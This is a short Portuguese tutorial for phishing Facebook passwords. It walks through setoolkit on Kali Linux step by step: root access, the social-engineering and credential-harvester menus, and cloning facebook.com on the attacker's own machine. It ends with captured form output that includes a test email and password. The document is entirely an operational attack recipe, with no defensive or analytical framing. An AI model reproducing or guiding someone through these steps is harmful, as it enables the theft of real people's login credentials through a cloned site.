# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

### Resutados

- POSSIBLE USERNAME FIELD FOUND: skip_api_login~
- PARAM: signed_next=
- PARAM: trynum=1
- PARAM: timezone=180
- PARAM: lgndim=eyJ3IjogMTkyMCwgImgiOiAxMDgwLCAiYXYiOiAxOTIwfQ
- PARAM: lgnrnd=132556_dsFF
- PARAM: lgnjs=4019581468

POSSIBLE USERNAME FIELD FOUND: email=marcosteste@hotmail.com 
POSSIBLE PASSWORD FIELD FOUND: pass=testeste

- PARAM: prefill_contact_point=
- PARAM: prefill_source=
- PARAM: prefill_type=1
- PARAM: first_prefill_source=
